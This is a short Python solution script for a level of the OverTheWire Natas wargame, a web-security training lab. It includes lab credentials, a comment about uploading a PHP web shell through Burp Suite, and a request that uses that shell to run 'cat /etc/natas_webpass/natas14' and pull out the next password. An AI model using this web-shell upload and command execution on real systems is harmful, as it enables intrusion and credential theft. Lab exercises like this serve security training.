#!/usr/bin/env python3

import requests
import re

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org' % username

# response = requests.get(url, auth=(username, password))
# content = response.text

# use burp suite to upload shell php
# http://natas12.natas.labs.overthewire.org/upload/fprqvursey.php?cmd=

url_flag = url + '/upload/68qjm4uror.php?cmd=cat /etc/natas_webpass/natas14'
response = requests.get(url_flag, auth=(username, password))
content = response.text

flag = re.findall('GIF89a;\n(.*)', content)[0]

print(flag)